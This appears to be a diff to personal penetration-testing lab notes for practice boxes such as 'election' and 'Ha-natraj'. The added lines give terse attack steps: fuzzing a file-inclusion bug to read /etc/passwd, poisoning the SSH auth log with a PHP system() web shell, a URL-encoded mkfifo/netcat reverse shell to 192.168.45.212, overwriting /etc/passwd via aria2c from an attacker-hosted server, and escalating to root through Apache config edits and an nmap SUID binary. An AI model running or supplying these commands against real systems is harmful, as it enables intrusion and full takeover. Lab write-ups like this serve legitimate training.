@@ -626,7 +626,8 @@ love@election:/tmp$ ./linpeas.sh
 [+] [CVE-2021-4034] PwnKit 
 ```
 
-8. Run pwnkit and obtained proof.txt
+8. Run pwnkit and obtained proof.txt, Can also be done with -   
+Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1) 
 ```
 love@election:/tmp$ ./PwnKit 
 root@election:/tmp# id
@@ -1680,7 +1681,7 @@ root2:$1$Y6flXwJY$iNJRatoNlIqE/CKcFYz6t0:0:0:root:/root:/bin/bash
 
 python3 -m http.server 8000
 
-aria2c -d /etc -o passwd "http://192.168.45.249:8000/passwd" --allow-overwrite=true
+aria2c -d /etc -o passwd "http://192.168.45.212:800/passwd" --allow-overwrite=true
 ```
 
 4. Prooft
@@ -2072,4 +2073,26 @@ a. sudo /bin/nice /notes/../home/webadmin/1.sh
 1. Nikto shows vulnerability with 'shellshock'
 2. Foothold with. msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec)
 3. Privesc with dirtycow. 
+```
+
+
+## Ha-natraj
+```
+wfuzz -c -w /home/kali/Downloads/subdomains-top1million-5000.txt -u http://192.168.165.80/console/file.php?FUZZ=/etc/passwd --hc 404 --hw 0
+
+http://192.168.165.80/console/file.php?file=/var/log/auth.log
+
+nc -nv 192.168.165.80 22   
+(UNKNOWN) [192.168.165.80] 22 (ssh) open
+SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+'<?php system($_GET['c']); ?>'
+Protocol mismatch.
+
+http://192.168.165.80/console/file.php?file=/var/log/auth.log&c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.212%201234%20%3E%2Ftmp%2Ff
+
+www-data@ubuntu:/tmp$ sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf
+www-data@ubuntu:/tmp$ sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf
+
+connect again. 
+it will mahakal and use nmap SUID to root
 ```
